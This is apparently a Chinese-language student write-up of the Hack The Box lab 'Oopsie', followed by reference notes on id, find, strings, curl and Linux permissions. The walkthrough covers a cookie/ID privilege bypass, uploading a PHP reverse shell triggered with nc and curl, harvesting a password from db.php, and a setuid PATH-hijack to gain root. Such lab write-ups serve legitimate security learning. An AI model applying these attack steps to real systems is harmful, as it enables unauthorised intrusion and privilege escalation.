# Oopsie

> 开始简单记思路，以及工具、命令的使用

## 渗透流程

### 信息搜集

- nmap扫描，得知目标Linux主机开放了ssh和http
- 访问web页面，开扫描器，得到`http://10.10.10.28/cdn-cgi/login/`这样一个看起来就有问题的路径

### 越权

- （巨坑，这步属实阴间）登入login页面，根据前一关得到的密码，在这里尝试，发现居然可以进去（彻底裂开）
- 进入后台界面，发现有个上传文件的功能，但是仅允许superadmin身份，而目前登入的是admin身份
- 研究cookie，发现身份的校验是由角色名和用户编号确定的，需要越权到superadmin，但是还不知道密码
- 在后台的另一个账号信息展示界面，根据请求参数里的`id`，页面会返回不同的用户信息，这个参数的传递和处理不受cookie内容的影响，因此可以从这里做文章
- 使用bp爆破id参数，观察返回长度来分辨不同的账户，最终确定superadmin的用户编号，利用编号修改cookie，发现已经可以上传文件

### 获取并连接webshell（建立落脚点 foothold）

- 成功登入后台，使用kali默认自带的php webshell，位置在`/usr/share/webshells/php/php-reverse-shell.php`，修改本机ip和监听端口后，将shell上传到服务器
- 并未返回上传路径，需要自行扫描上传文件路径，使用[开源工具](https://github.com/maurosoria/dirsearch)进行敏感目录搜索，最终定位到`http://10.10.10.28/uploads/`
- 使用`nc -nvlp 1234`监听1234端口，使用`curl http://10.10.10.28/uploads/php-reverse-shell.php`触发反弹shell，成功连接。

> 下面这几步操作具体含义不是很理解，作为一个坑留到这，但不影响渗透过程

- 升级shell

```sh
# script记录，并把记录丢弃
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

升级后，可以在shell下进行tab补全、ctrl+c这类操作

### 内网漫游（lateral movement）

- 在`/var/www/html/cdn-cgi/login`发现`db.php`，从中得到用户`robert`的口令，使用su切换，获取`/home/robert/user.txt`内的user flag
- 此时下一个目标是提权并拿到root flag

### 提权（Privilege Escalation）

- 使用`id`查看robert的用户权限信息，发现其属于bugtracker组
- `find / -type f -group bugtracker 2>/dev/null`尝试查找此组是否具有特殊的访问权限
- 发现该组对于`/usr/bin/bugtracker`有s权限（setuid）
- 研究bugtracker程序，发现其作用为输出对应编号的bug报告
- 用`strings`简单看一下程序里面是否执行了shell命令，发现`cat /root/reports`，进一步得出，调用此命令前，robert需要通过setuid来切换到root权限
  - 附注：通过`setuid(0)`将进程euid设置为root uid，则执行cat时，cat启动时的guid和euid为root权限。
- 因此，替换cat的二进制文件内容，用一个简单的`/bin/bash`脚本文件代替，这样，当再次执行bugtracker时，robert先拿到root权限，再执行被替换掉的cat，就拿到了root权限的shell
- 最后在root文件夹下获取root flag

## Linux提高

> 感觉教程里面，额外学到的Linux知识比学到的渗透思路还要多=-=

### id

- `id [-gGnru][--help][--version][用户名称]`
- 参数说明：
    `-g`或`--group` 　显示用户所属群组的ID。
    `-G`或`--groups` 　显示用户所属附加群组的ID。
    `-n`或`--name` 　显示用户，所属群组或附加群组的名称。
    `-r`或`--real` 　显示实际ID。
    `-u`或`--user` 　显示用户ID。

### find

- `find path -option[-print ][-exec -ok command]{} \;`
- 常用参数
  - `-mount`, `-xdev` : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件
  - `-amin n` : 在过去 n 分钟内被读取过
  - `-anewer file` : 比文件 file 更晚被读取过的文件
  - `-atime n` : 在过去n天内被读取过的文件
  - `-cmin n` : 在过去 n 分钟内被修改过
  - `-cnewer file` :比文件 file 更新的文件
  - `-ctime n` : 在过去n天内被修改过的文件
  - `-empty` : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name
  - `-ipath p`, `-path p` : 路径名称符合 p 的文件，ipath 会忽略大小写
  - `-name name`, `-iname name` : 文件名称符合 name 的文件。iname 会忽略大小写
  - `-size n` : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。
  - `-type c` : 文件类型是 c 的文件。
    - `d`: 目录
    - `f`: 一般文件
    - `l`: 符号连结
    - `s`: socket
  - `-pid n` : process id 是 n 的文件

### strings

- `strings   [-afovV] [-min-len]`
            `[-n min-len] [--bytes=min-len]`
            `[-t radix] [--radix=radix]`
            `[-e encoding] [--encoding=encoding]`
            `[-] [--all] [--print-file-name]`
            `[-T bfdname] [--target=bfdname]`
            `[-w] [--include-all-whitespace]`
            `[-s] [--output-separatorsep_string]`
            `[--help] [--version] file...`
- 常用参数
  - `-a` `--all`: 扫描全文件，默认的配置
  - `-d` `--data`：仅输出文件中已初始化、已加载的数据段
  - `-min-len` `-n min-len` `--bytes=min-len`: 至少输出min-len个字符，默认为4
  - `-t radix` `--radix=radix`: o x d，对应八、十六、十进制
  - `-e encoding` `--encoding=encoding`:s = single-7-bit-byte characters (ASCII, ISO 8859, etc., default), S = single-8-bit-byte characters, b = 16-bit bigendian, l = 16-bit littleendian, B = 32-bit bigendian, L = 32-bit littleendian. Useful for finding wide character strings. (l and b apply to, for example, Unicode UTF-16/UCS-2 encodings)

### curl

- `-A`参数指定客户端的User-Agent。curl 的默认用户代理字符串是`curl/[version]`
  - `curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com`
  - `curl -A '' https://google.com`
  - `curl -H 'User-Agent: php/1.0' https://google.com`
- `-b`参数用来向服务器发送 Cookie
  - `curl -b 'foo1=bar;foo2=bar2' https://google.com`
  - `curl -b cookies.txt https://www.google.com`
- `-c`参数将服务器设置的 Cookie 写入一个文件
  - `curl -c cookies.txt https://www.google.com`
- `-d`参数用于发送 POST 请求的数据体。使用`-d '@file'`的方式可以从指定文件读取
  - `curl -d'login=emma＆password=123'-X POST https://google.com/login`
  - `curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login`
  - `curl -d '@data.txt' https://google.com/login`
- `--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码
  - `curl --data-urlencode 'comment=hello world' https://google.com/login`
- `-e`参数用来设置 HTTP 的标头Referer
  - `curl -e 'https://google.com?q=example' https://www.example.com`
  - `curl -H 'Referer: https://google.com?q=example' https://www.example.com`
- `-F`参数用来向服务器上传二进制文件
  - `curl -F 'file=@photo.png' https://google.com/profile`
  - `curl -F 'file=@photo.png;type=image/png' https://google.com/profile`
  - `curl -F 'file=@photo.png;filename=me.png' https://google.com/profile`
- `-G`参数用来构造 URL 的查询字符串
  - `curl -G -d 'q=kitties' -d 'count=20' https://google.com/search`
  - `curl -G --data-urlencode 'comment=hello world' https://www.example.com`
- `-H`参数添加 HTTP 请求的标头
  - `curl -H 'Accept-Language: en-US' https://google.com`
  - `curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com`
  - `curl -d '{"login": "emma", "pass": "123"}' -H 'Content-Type: application/json' https://google.com/login`
- `-i`参数打印出服务器回应的 HTTP 标头
- `-I` '--head'参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来
- `-k`参数指定跳过 SSL 检测
- `-L`参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
- `--limit-rate`用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境
  - `curl --limit-rate 200k https://google.com`
- `-o`参数将服务器的回应保存成文件，等同于wget命令
- `-O`参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。
- `-s`参数将不输出错误和进度信息
- `-S`参数指定只输出错误信息
- `-u`参数用来设置服务器认证的用户名和密码
  - `curl https://bob:12345@google.com/login`
  - `curl -u 'bob' https://google.com/login`
- `-v`参数输出通信的整个过程，用于调试
- `--trace`参数也可以用于调试，还会输出原始的二进制数据
- `-x`参数指定 HTTP 请求的代理
  - `curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com`
- `-X`参数指定 HTTP 请求的方法

### Linux权限

- DAC安全模型核心：在 Linux 中，进程理论上所拥有的权限与执行它的用户的权限相同。其中涉及的一切内容，都是围绕这个核心进行的
- DAC中，通过 `/etc/passwd` 和 `/etc/group` 保存用户和组信息，通过 `/etc/shadow` 保存密码口令及其变动信息， 每行一条记录
- 用户和组分别用 UID 和 GID 表示，**一个用户可以同时属于多个组**，**默认每个用户必属于一个与之 UID 同值同名的 GID**
- 对于 `/etc/passwd` , 每条记录字段分别为 用户名: 口令（在/etc/shadow加密保存）：UID:GID（默认 UID）: 描述注释: 主目录: 登录 shell(第一个运行的程序)
- 对于 `/etc/group` ， 每条记录字段分别为 组名：口令（一般不存在组口令）：GID：组成员用户列表（逗号分割的用户 UID 列表）
- 对于 `/etc/shadow` ，每条记录字段分别为： 登录名: 加密口令: 最后一次修改时间: 最小时间间隔: 最大时间间隔: 警告时间: 不活动时间:
- 访问权限控制组：user group others
- 文件类型
  - 普通文件， 又包括文本文件和二进制文件， 可用 touch 创建；
  - 套接字文件， 用于网络通讯，一般由应用程序在执行中间接创建；
  - 管道文件是有名管道，而非无名管道， 可用 mkfifo 创建；
  - 字符文件和块文件均为设备文件， 可用 mknod 创建；
  - 链接文件是软链接文件，而非硬链接文件, 可用 ln 创建。

- 权限类型
  - r 表示具有读权限。
  - w 表示具有写权限。
  - x 一般针对可执行文件 / 目录，表示具有执行 / 搜索权限。
  - s 一般针对可执行文件 / 目录，表示具有赋予文件属主权限的权限，只有 user 和 group 组可以设置该权限。
  - t 一般针对目录，设置粘滞位后，有权限的用户只能写、删除自己的文件, 否则可写、删除目录所有文件

- 进程权限
  - **effective user id : 进程访问文件权限相关的 UID （简写为 euid ）。**
  - effective group id : 进程访问文件权限相关的 GID （简写为 egid ）。
  - real user id : 创建该进程的用户登录系统时的 UID （简写为 ruid ）。
  - real group id : 创建该进程的用户登录系统时的 GID （简写为 rgid ）。
  - saved set user id : 拷贝自 euid 。
  - saved set group id : 拷贝自 egid 。
  - chmod第一位数字经常省略，其第一位数字对应的三个比特位分别表示setuid setgid stiky位
    - 若目录没设置粘滞位，任何对目录有写权限者都则可删除其中任何文件和子目录，即使他不是相应文件的所有者，也没有读或写许可 ; 设置粘滞位后，用户就只能写或删除属于他的文件和子目录。

### script

记录输出到终端的内容，该记录可以保存并在以后再打印出来。-q表示静默模式执行

### setuid

setuid实际意义是set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid， 也就是说当setuid位被设置之后， 当文件或程序(统称为executable)被执行时, 操作系统会赋予文件所有者的权限, 因为其euid是文件所有者的uid

## 参考

- [阮大的curl介绍文章](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)
- [https://www.linuxprobe.com/linux-rights-control.html](https://www.linuxprobe.com/linux-rights-control.html)
- [https://blog.csdn.net/weixin_44575881/article/details/86552016](https://blog.csdn.net/weixin_44575881/article/details/86552016)
